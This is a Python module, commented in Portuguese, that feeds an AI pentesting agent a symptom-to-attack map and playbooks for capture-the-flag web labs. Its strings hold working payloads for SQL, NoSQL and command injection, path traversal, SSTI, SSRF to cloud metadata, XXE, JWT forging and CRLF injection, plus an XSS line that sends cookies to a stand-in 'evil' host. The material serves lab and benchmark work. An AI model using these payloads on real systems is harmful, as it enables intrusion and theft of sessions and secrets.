"""Conhecimento tatico do agente, MODULAR.

Por que existe: modelos menores (Qwen 7B/3B) so resolvem um nivel se o prompt
ensinar a tecnica CONCRETA (payloads, como provar, como escalar). Mas empilhar as
27 receitas inline no system prompt incha o contexto e dilui a atencao do modelo.

Solucao (hibrida):
  - SIGNALS  -> SEMPRE no system prompt. Mapa enxuto sintoma->tecnica; e o que faz
    o modelo RECONHECER qual ataque tentar a partir do que ele VE no alvo.
  - PLAYBOOKS -> entregues SOB DEMANDA pela ferramenta `playbook(tecnica)`. Quando
    o modelo suspeita de uma tecnica, ele pede a receita e recebe a MECANICA.

Assim cada execucao so paga (em tokens) pelos playbooks que realmente usa, e
adicionar/ajustar uma tecnica e editar UMA entrada deste dicionario.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# SIGNALS: sintoma observavel  ->  tecnica a pedir via playbook(<chave>).
# Curto de proposito; mora no system prompt o tempo todo.
# ---------------------------------------------------------------------------
SIGNALS = (
    "Mapa de SINAIS (o que voce VE no alvo -> tecnica a investigar; peca a receita "
    "com playbook(<tecnica>)):\n"
    "- formulario de login que separa admin de comum -> 'sqli'\n"
    "- login que aceita JSON/objeto no corpo (ex: framework Mongo) -> 'nosqli'\n"
    "- URL com id de recurso (?id=, /conta/2) -> 'idor'\n"
    "- endpoint que busca/baixa uma URL pra voce (?url=, fetch, preview) -> 'ssrf'\n"
    "- fetcher com allowlist + um endpoint de redirect (/go?to=) -> 'open_redirect'\n"
    "- endpoint que roda comando do SO (ping, nslookup) -> 'cmdi'\n"
    "- endpoint que serve arquivo por nome (?file=, ?page=, ?doc=) -> 'lfi'\n"
    "- endpoint que ECOA seu texto numa saudacao/mensagem (?name=, ?msg=) -> 'ssti'\n"
    "- busca/campo que reflete seu texto cru dentro do HTML da resposta -> 'xss'\n"
    "- token JWT (3 partes x.y.z) + area que exige admin -> 'jwt_none' (e 'jwt_hmac' se HS256)\n"
    "- cookie de sessao que e base64 de um JSON sem assinatura -> 'cookie'\n"
    "- cookie/campo que e base64 e o servidor parece DESSERIALIZAR (eval/pickle) -> 'deserialization'\n"
    "- cadastro/perfil que aceita campos extras (POST com varios campos) -> 'mass_assignment'\n"
    "- area que da 403 so no GET -> 'verb_tampering'\n"
    "- app que confia em header de IP de origem -> 'xff'\n"
    "- app cujo roteamento/links dependem do header Host -> 'host_header'\n"
    "- /robots.txt, dotfiles, backups (.bak/.old/.git/.env) -> 'file_disclosure'\n"
    "- area protegida por HTTP Basic (header WWW-Authenticate / 401 Basic) -> 'basic_auth'\n"
    "- carrinho/checkout com preco e quantidade -> 'business_logic'\n"
    "- erro/excecao que vaza stack trace, config ou variaveis -> 'verbose_error'\n"
    "- endpoint /graphql -> 'graphql'\n"
    "- endpoint que recebe/parseia XML -> 'xxe'\n"
    "- upload de arquivo que o servidor parece executar/incluir -> 'upload_rce'\n"
    "- API que reflete o header Origin (CORS) -> 'cors'\n"
    "- redirect/Location montado a partir de um parametro seu (?next=, ?url=) -> 'crlf'\n"
    "- /admin da 403 mas o roteador normaliza o path -> 'path_bypass'\n"
)

# ---------------------------------------------------------------------------
# PLAYBOOKS: a receita concreta de cada tecnica. Entregue sob demanda.
# ---------------------------------------------------------------------------
PLAYBOOKS: dict[str, str] = {
    "sqli": (
        "SQL INJECTION (bypass de login). A query do servidor costuma ser "
        "WHERE username='<input>' AND password='<input>'. Seu payload precisa FECHAR "
        "a aspa e COMENTAR o resto com -- (dois tracos e um espaco), senao o "
        "AND password derruba a condicao. Varie no campo username, um por tentativa:\n"
        "    ' OR '1'='1' -- \n"
        "    admin' -- \n"
        "    ' OR 1=1 -- \n"
        "    ') OR ('1'='1' -- \n"
        "A flag aparece no painel apos o login passar."
    ),
    "nosqli": (
        "NoSQL INJECTION (operador $ne). A app monta um filtro Mongo a partir do "
        "corpo SEM forcar tipos. Em form-urlencoded, um campo 'password[$ne]=x' vira "
        "{'password': {'$ne':'x'}} ('diferente de x'), que casa com qualquer senha.\n"
        "    POST /login com data={'username':'admin', 'password[$ne]':'x'}\n"
        "Variacoes do operador: $gt, $regex. Loga como admin sem saber a senha -> flag."
    ),
    "idor": (
        "IDOR (broken access control). Exige ORDEM: (1) PRIMEIRO faca login de verdade "
        "com credenciais validas (a home costuma mostrar 'guest/guest' no HTML) para "
        "obter sessao; (2) SO DEPOIS acesse /conta?id=N e ENUMERE ids (1,2,3...). "
        "Se a resposta disser 'faca login' ou der 401, voce NAO esta autenticado: "
        "volte e logue — trocar o id nao adianta. A flag costuma estar na conta de "
        "MENOR id (admin, id=1). Cookies de sessao persistem entre chamadas."
    ),
    "ssrf": (
        "SSRF. Um endpoint busca uma URL PARA voce (?url=, /fetch, /preview). Use-o "
        "para alcancar recursos INTERNOS que voce nao atinge direto:\n"
        "    ?url=http://localhost:PORT/flag\n"
        "    ?url=http://127.0.0.1:PORT/   (servico interno)\n"
        "    ?url=http://169.254.169.254/  (metadados de cloud)\n"
        "Leia a home: ela costuma dizer o host:porta e o caminho do servico interno."
    ),
    "open_redirect": (
        "OPEN REDIRECT + SSRF (encadeado). Um fetcher/preview do SERVIDOR so aceita uma "
        "allowlist (ex: /go ou /public do host publico). A flag fica num host INTERNO "
        "(ex: http://127.0.0.2:PORT/flag) que VOCE nao alcanca direto. Existe um open "
        "redirect (/go?to=...) DENTRO da allowlist. ENCADEIE: peca ao preview um alvo "
        "PERMITIDO (/go) que redireciona pro host interno — o fetcher do servidor segue "
        "o redirect e vaza a flag. Pedir /go direto NAO funciona (seu cliente respeita "
        "a allowlist no redirect). Monte (URL-encode o target inteiro):\n"
        "    /preview?target=http://127.0.0.1:PORT/go?to=http://127.0.0.2:PORT/flag\n"
        "A home diz o endereco exato do recurso interno e os caminhos aceitos."
    ),
    "cmdi": (
        "COMMAND INJECTION. Um endpoint roda um comando do SO com seu parametro "
        "(ex: /ping?host=...), montando algo como `ping -c1 <host>` no shell. Encadeie "
        "OUTRO comando pra ler a flag, variando o separador por tentativa:\n"
        "    ?host=127.0.0.1; cat /flag\n"
        "    ?host=127.0.0.1 && cat /flag\n"
        "    ?host=127.0.0.1 | cat /flag\n"
        "    ?host=$(cat /flag)\n"
        "A flag costuma estar em /flag; se nao souber o caminho, rode `ls` antes. "
        "URL-encode espaco, ;, & e | na querystring."
    ),
    "lfi": (
        "PATH TRAVERSAL / LFI. Um endpoint serve arquivo pelo nome (ex: "
        "/download?file=manual.txt) lendo de uma pasta fixa SEM confinar o caminho. "
        "Use ../ pra escapar da pasta:\n"
        "    ?file=../../../../flag\n"
        "    ?file=/flag            (caminho absoluto direto)\n"
        "    ?file=../../../../etc/passwd\n"
        "Leia a home: ela costuma dizer ONDE a flag esta. Suba ../ o suficiente pra "
        "chegar na raiz antes do nome do arquivo."
    ),
    "ssti": (
        "SSTI (Server-Side Template Injection). Um endpoint REFLETE seu texto numa "
        "saudacao (ex: /hello?name=...). Primeiro PROVE com {{7*7}}: se a resposta vier "
        "'49' (e nao o literal '{{7*7}}'), e template. Depois ESCALE (URL-encode):\n"
        "    ?name={{7*7}}            (recon: confirma template)\n"
        "    ?name={{config}}         (vaza o objeto de config — costuma ter a flag)\n"
        "    ?name={{config['FLAG']}} (le um campo direto)\n"
        "O objeto `config` (estilo Flask) geralmente carrega segredos e a flag."
    ),
    "xss": (
        "REFLECTED XSS. Uma busca/campo reflete seu texto CRU dentro do HTML, sem "
        "escapar. Injete um VETOR de execucao de script; o lab simula a vitima (admin) "
        "abrindo a pagina e devolve a flag no corpo quando detecta o vetor. Tente "
        "(URL-encode na querystring):\n"
        "    ?q=<script>alert(1)</script>\n"
        "    ?q=<img src=x onerror=alert(1)>\n"
        "    ?q=<svg onload=alert(1)>\n"
        "Num alvo real a prova seria roubar o cookie: <script>fetch('//evil/?c='+document.cookie)</script>."
    ),
    "jwt_none": (
        "JWT FORGE (alg=none). A app emite um JWT (3 partes x.y.z) e uma area (ex: "
        "/admin) exige role=admin. (1) faca login pra receber um token; (2) jwt_decode "
        "pra ver o payload (campos como role); (3) jwt_forge com "
        "payload={'user':'admin','role':'admin'} e alg='none'; (4) refaca a requisicao "
        "a area protegida com headers={'Authorization':'Bearer <token_forjado>'}. "
        "Verificadores que aceitam alg=none nao checam assinatura — por isso funciona."
    ),
    "jwt_hmac": (
        "JWT HMAC FRACO (HS256). Aqui o servidor VALIDA a assinatura HS256 — o problema "
        "e o segredo fraco (de dicionario). (1) faca login pra pegar um token legitimo; "
        "(2) jwt_crack(token) pra descobrir o segredo por brute-force; (3) jwt_forge com "
        "alg='HS256', secret=<segredo>, payload={'user':'admin','role':'admin'}; "
        "(4) envie em headers={'Authorization':'Bearer <token>'} na area admin -> flag."
    ),
    "cookie": (
        "COOKIE TAMPERING. O servidor manda um cookie de sessao (Set-Cookie, ex: sess=...) "
        "que e so base64 de um JSON SEM assinatura. (1) pegue o valor do cookie na "
        "resposta; (2) b64_decode pra ver o JSON (campos como role); (3) edite role pra "
        "'admin' e b64_encode o JSON novo; (4) refaca a requisicao a area restrita com "
        "headers={'Cookie':'sess=<valor_forjado>'}. Sem assinatura, o servidor confia."
    ),
    "deserialization": (
        "INSECURE DESERIALIZATION. Um cookie/campo e base64 e o servidor o DESSERIALIZA "
        "de forma insegura — aqui, eval(base64decode(cookie)). Isso executa codigo seu "
        "no escopo do app. A home costuma dizer QUAL variavel esta no escopo do eval "
        "(ex: FLAG). Faca: b64_encode('FLAG') (so o NOME da variavel, uma expressao que "
        "devolve o valor) e mande em headers={'Cookie':'prefs=<b64>'} no endpoint que "
        "desserializa (ex: /painel). O eval devolve a flag. Mantenha SIMPLES: nao tente "
        "import os / __builtins__ (namespace restrito); basta avaliar a variavel."
    ),
    "mass_assignment": (
        "MASS ASSIGNMENT. O cadastro/perfil copia TODOS os campos do request pro modelo, "
        "sem allowlist. Mande um campo extra que voce nao deveria controlar:\n"
        "    POST /register com data={'username':'x','password':'y','role':'admin'}\n"
        "A conta nasce admin -> acesse a area restrita -> flag."
    ),
    "verb_tampering": (
        "HTTP VERB TAMPERING. A regra de autorizacao cobre so um metodo (ex: nega GET "
        "/admin -> 403), mas o handler responde a qualquer verbo. Se GET /admin da 403, "
        "tente o MESMO path com outro metodo: POST, depois PUT, DELETE, HEAD. O controle "
        "nao se aplica e o conteudo (a flag) vaza."
    ),
    "xff": (
        "TRUSTED HEADER SPOOF (X-Forwarded-For). A app decide acesso pelo IP de origem "
        "lido de um header que VOCE controla. Mande um IP 'interno' confiavel pra se "
        "passar pela rede interna:\n"
        "    GET /admin com headers={'X-Forwarded-For':'127.0.0.1'}\n"
        "Varie o IP: 10.0.0.1, 192.168.0.1, 172.16.0.1. A home pode dar a dica do IP."
    ),
    "host_header": (
        "HOST HEADER INJECTION. A app roteia vhost / decide acesso pelo header Host, que "
        "voce controla. Mande um vhost 'interno' pra ser roteado ao painel restrito:\n"
        "    GET /admin com headers={'Host':'admin.corp.local'}\n"
        "Leia a home: ela costuma citar o nome do vhost interno aceito."
    ),
    "file_disclosure": (
        "SENSITIVE FILE EXPOSURE. Arquivos sensiveis ficam acessiveis pela web e o "
        "/robots.txt costuma APONTAR pra eles. Faca: (1) GET /robots.txt e leia as linhas "
        "Disallow — elas revelam caminhos secretos (ex: /backup/db_dump.bak); (2) GET "
        "desse caminho -> a flag esta no backup/dump. Tente tambem /.git/, /.env, sufixos "
        ".bak/.old/~. robots.txt nao protege nada, so indica."
    ),
    "basic_auth": (
        "BASIC AUTH com CREDENCIAIS PADRAO. Uma area pede HTTP Basic (401 + "
        "WWW-Authenticate: Basic). Basic = base64('usuario:senha') no header. Credenciais "
        "de fabrica nunca trocadas sao triviais. Faca b64_encode('admin:admin') e mande:\n"
        "    GET /admin com headers={'Authorization':'Basic <b64>'}\n"
        "admin:admin vira 'YWRtaW46YWRtaW4='. Tente tambem admin:password, admin:123456."
    ),
    "business_logic": (
        "BUSINESS LOGIC (quantidade negativa). O checkout valida preco*qtd <= saldo mas "
        "NAO exige qtd > 0. Uma quantidade negativa torna o total <= 0, 'cabendo' no "
        "saldo:\n"
        "    POST /checkout com data={'item':'premium','qtd':'-1'}\n"
        "Total negativo -> compra aprovada -> flag. Scanner de injecao nao pega isso; e "
        "logica. Pense em invariantes que o app esqueceu de validar."
    ),
    "verbose_error": (
        "VERBOSE ERROR / DEBUG LEAK. Com debug ligado, uma excecao devolve pagina de erro "
        "com stack trace, config e variaveis — vazando segredos. Mande entrada MALFORMADA "
        "que dispare uma excecao nao tratada:\n"
        "    GET /api/saldo?id=abc   (texto onde se espera int -> int('abc') quebra)\n"
        "O dump de debug despeja a config (com a flag). Tente tipos errados em parametros "
        "que pareçam numericos."
    ),
    "graphql": (
        "GRAPHQL INTROSPECTION. O endpoint /graphql expoe o proprio schema. Use "
        "introspection pra achar um campo escondido e depois consulte-o (URL-encode a "
        "query):\n"
        "    GET /graphql?query={__schema{types{name fields{name}}}}\n"
        "    -> descubra um campo nao documentado (ex: secretFlag)\n"
        "    GET /graphql?query={secretFlag}\n"
        "A resposta da introspection lista os campos; o escondido devolve a flag."
    ),
    "xxe": (
        "XXE (XML External Entity). Um endpoint parseia XML com entidades externas "
        "ligadas. Mande (http_request com body CRU e header Content-Type: text/xml) um "
        "XML que declara uma entidade apontando pro arquivo da flag e a referencia num "
        "elemento que a resposta ECOA:\n"
        "    <?xml version=\"1.0\"?>\n"
        "    <!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n"
        "    <comment>&xxe;</comment>\n"
        "POST no endpoint de parse (ex: /parse) -> a resposta ecoa o conteudo de "
        "file:///flag. Leia a home pro nome do elemento esperado."
    ),
    "upload_rce": (
        "UPLOAD IRRESTRITO -> RCE. Upload sem restricao + o servidor EXECUTA o arquivo "
        "enviado. Envie um arquivo cujo conteudo le o segredo do contexto. Use "
        "http_request com files={'arquivo':{'filename':'x.py','content':'print(SECRET)'}}.\n"
        "MANTENHA SIMPLES: a flag costuma estar numa variavel ja no escopo (ex: SECRET) — "
        "basta print(SECRET). NAO tente import os / __builtins__ (namespace restrito) — "
        "isso falha. Leia a home pro nome do campo de upload e da variavel."
    ),
    "cors": (
        "CORS MISCONFIG. A API reflete qualquer header Origin em "
        "Access-Control-Allow-Origin e ainda manda Allow-Credentials: true — um site "
        "terceiro le a resposta autenticada da vitima. Prove assim: (1) visite / pra "
        "ganhar o cookie de sessao (persiste sozinho); (2) chame o endpoint de dados "
        "MANDANDO um header Origin CROSS-ORIGIN (de outro site):\n"
        "    GET /api/dados com headers={'Origin':'http://evil.example'}\n"
        "Com sessao + Origin de outra origem, o lab devolve a flag. Same-origin ou sem "
        "cookie NAO libera."
    ),
    "crlf": (
        "CRLF / HEADER INJECTION. Um parametro seu (ex: ?next=) vai pro header Location "
        "sem filtrar CR/LF, e passa por url-decode. Injetar %0d%0a (\\r\\n) quebra a linha "
        "do header e permite injetar headers proprios (ex: Set-Cookie). Mande:\n"
        "    GET /ir?next=/x%0d%0aSet-Cookie:role=admin\n"
        "O lab detecta o CRLF no next e devolve a flag (o cliente nao expoe o header "
        "injetado). Use %0d%0a literalmente na URL."
    ),
    "path_bypass": (
        "AUTH BYPASS POR NORMALIZACAO DE PATH. O controle de acesso bloqueia o path "
        "EXATO /admin (403), mas o roteador NORMALIZA o path antes de servir (resolve "
        "., .., //, %2e, barra final). Use uma variante que normaliza pra /admin mas "
        "nao e a string literal:\n"
        "    GET /admin/      (barra final)\n"
        "    GET //admin\n"
        "    GET /./admin\n"
        "    GET /%2e/admin\n"
        "Uma dessas passa pelo bloqueio e serve a area admin com a flag."
    ),
}


# ---------------------------------------------------------------------------
# Lookup tolerante: o modelo pode pedir 'SQL injection', 'xss', 'jwt none'...
# ---------------------------------------------------------------------------
def _norm(name: str) -> str:
    out = (name or "").strip().lower()
    for ch in (" ", "-", "/"):
        out = out.replace(ch, "_")
    while "__" in out:
        out = out.replace("__", "_")
    return out.strip("_")


# Apelidos comuns -> chave canonica (chaves ja normalizadas com _norm no load).
_ALIASES_RAW = {
    "sql": "sqli", "sql_injection": "sqli", "sqli": "sqli",
    "nosql": "nosqli", "nosql_injection": "nosqli", "mongo": "nosqli",
    "command_injection": "cmdi", "cmd_injection": "cmdi", "rce_shell": "cmdi", "command": "cmdi",
    "path_traversal": "lfi", "traversal": "lfi", "file_read": "lfi", "lfi": "lfi",
    "template_injection": "ssti", "jinja": "ssti",
    "cross_site_scripting": "xss", "reflected_xss": "xss",
    "jwt": "jwt_none", "jwt_alg_none": "jwt_none", "jwt_none": "jwt_none", "jwt_forge": "jwt_none",
    "jwt_weak_secret": "jwt_hmac", "jwt_crack": "jwt_hmac", "hs256": "jwt_hmac", "jwt_hmac": "jwt_hmac",
    "cookie_tampering": "cookie", "session": "cookie",
    "deserialize": "deserialization", "insecure_deserialization": "deserialization",
    "pickle": "deserialization", "eval": "deserialization",
    "mass_assign": "mass_assignment", "mass_assignment": "mass_assignment",
    "verb": "verb_tampering", "http_verb": "verb_tampering", "verb_tampering": "verb_tampering",
    "x_forwarded_for": "xff", "xforwardedfor": "xff", "ip_spoof": "xff", "xff": "xff",
    "host": "host_header", "host_injection": "host_header", "vhost": "host_header",
    "robots": "file_disclosure", "file_exposure": "file_disclosure",
    "sensitive_file": "file_disclosure", "disclosure": "file_disclosure", "backup": "file_disclosure",
    "basic": "basic_auth", "default_creds": "basic_auth", "basic_auth": "basic_auth",
    "logic": "business_logic", "negative_quantity": "business_logic", "business": "business_logic",
    "debug": "verbose_error", "error_leak": "verbose_error", "stack_trace": "verbose_error",
    "introspection": "graphql", "graph_ql": "graphql",
    "xxe": "xxe", "xml_external_entity": "xxe", "xml": "xxe",
    "upload": "upload_rce", "file_upload": "upload_rce", "rce": "upload_rce",
    "cors": "cors", "origin": "cors",
    "crlf": "crlf", "header_injection": "crlf", "response_splitting": "crlf",
    "path_normalization": "path_bypass", "normalization_bypass": "path_bypass",
    "403_bypass": "path_bypass", "path_bypass": "path_bypass",
}
_ALIASES = {_norm(k): v for k, v in _ALIASES_RAW.items()}


def available() -> list[str]:
    """Lista de tecnicas com playbook (chaves canonicas)."""
    return sorted(PLAYBOOKS)


def resolve(name: str) -> str | None:
    """Resolve o nome pedido pra uma chave canonica de PLAYBOOKS (ou None)."""
    key = _norm(name)
    if key in PLAYBOOKS:
        return key
    if key in _ALIASES:
        return _ALIASES[key]
    # match por subistring: 'sql_injection_login' contem 'sql'...
    for alias, canon in _ALIASES.items():
        if alias and (alias in key or key in alias):
            return canon
    for canon in PLAYBOOKS:
        if canon in key or key in canon:
            return canon
    return None
